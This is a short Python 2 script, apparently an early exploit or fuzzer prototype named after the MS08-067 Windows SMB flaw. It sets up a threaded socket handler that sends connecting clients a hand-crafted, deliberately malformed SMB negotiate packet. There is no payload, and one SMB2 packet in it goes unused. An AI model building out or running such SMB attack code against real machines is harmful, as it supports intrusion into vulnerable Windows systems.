import socket, threading
#from impackets.impacket import smbserver, smb


class ms08067(threading.Thread):
    
    def __init__(self,ip,port,clientsocket):
        threading.Thread.__init__(self)
        self.ip = ip
        self.port = port
        self.csocket = clientsocket
        print "[+] New thread started for " + self.ip + ":" + str(self.port)
    
    
    def run(self):    
        print "Connection from : "+self.ip+":"+str(self.port)
        data = self.csocket.recv(2048)
	print data
        # creating smb header request
        #smbheader = "\x00\x50\x56\xc0\x00\x01\x00\x0c\x29\x30\x60\x27\x08\x00\x45\x00\x00\xcd\x1f\x9a\x40\x00\x80\x06\x74\xbd\xc0\xa8\x72\x81\xc0\xa8\x72\x01\x01\xbd\xcd\xdf\x1b\xbf\x05\x47\x88\xf0\xe6\xb2\x80\x18\x00\x43\x08\x3b\x00\x00\x01\x01\x08\x0a\x00\xc0\x60\xd7\x06\xb3\x1e\x9c\x00\x00\x00\x95\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x88\x43\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x11\x0a\x00\x03\x0a\x00\x01\x00\x04\x11\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\xfd\xe3\x03\x80\xa8\x61\xb7\xcb\xb9\xec\xc5\x01\x6c\xfd\x00\x50\x00\xbd\xad\xb6\xaf\x27\x30\x66\x4c\x9e\xcd\x6c\x03\x4b\x35\x29\x4b\x60\x3e\x06\x06\x2b\x06\x01\x05\x05\x02\xa0\x34\x30\x32\xa0\x30\x30\x2e\x06\x09\x2a\x86\x48\x82\xf7\x12\x01\x02\x02\x06\x09\x2a\x86\x48\x86\xf7\x12\x01\x02\x02\x06\x0a\x2a\x86\x48\x86\xf7\x12\x01\x02\x02\x03\x06\x0a\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a"
        
        smbheader = ("\x00\x00\x00\x90" # Begin SMB header: Session message
"\xff\x53\x4d\x42" # Server Component: SMB
"\x72\x00\x00\x00" # Negociate Protocol
"\x00\x18\x53\xc8" # Operation 0x18 & sub 0xc853
"\x00\x00"# Process ID High: --> :) normal value should be "\x00\x00" "\x00\x26"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xfe"
"\x00\x00\x00\x00\x00\x6d\x00\x02\x50\x43\x20\x4e\x45\x54"
"\x57\x4f\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31"
"\x2e\x30\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00"
"\x02\x57\x69\x6e\x64\x6f\x77\x73\x20\x66\x6f\x72\x20\x57"
"\x6f\x72\x6b\x67\x72\x6f\x75\x70\x73\x20\x33\x2e\x31\x61"
"\x00\x02\x4c\x4d\x31\x2e\x32\x58\x30\x30\x32\x00\x02\x4c"
"\x41\x4e\x4d\x41\x4e\x32\x2e\x31\x00\x02\x4e\x54\x20\x4c"
"\x4d\x20\x30\x2e\x31\x32\x00\x02\x53\x4d\x42\x20\x32\x2e"
"\x30\x30\x32\x00")
        smbheader2 = "\xFE\x53\x4D\x42\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x41\x00\x00\x00\x06\x00\x00\x00\xB9\xFB\x9B\x60\xAD\x9C\xDD\x40\xA5\x47\xB1\x34\xA4\x6C\x8D\x9D\x0D\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x04\xB5\xEC\x87\xFE\xE3\xC5\x01\x72\xA2\x34\x21\xD6\xE3\xC5\x01\x80\x00\x40\x00\x00\x00\x00\x00\x60\x3E\x06\x06\x2B\x06\x01\x05\x05\x02\xA0\x34\x30\x32\xA0\x30\x30\x2E\x06\x09\x2A\x86\x48\x82\xF7\x12\x01\x02\x02\x06\x09\x2A\x86\x48\x86\xF7\x12\x01\x02\x02\x06\x0A\x2A\x86\x48\x86\xF7\x12\x01\x02\x02\x03\x06\x0A\x2B\x06\x01\x04\x01\x82\x37\x02\x02\x0A"
        self.csocket.send(smbheader)
        print self.csocket.recv(2048)
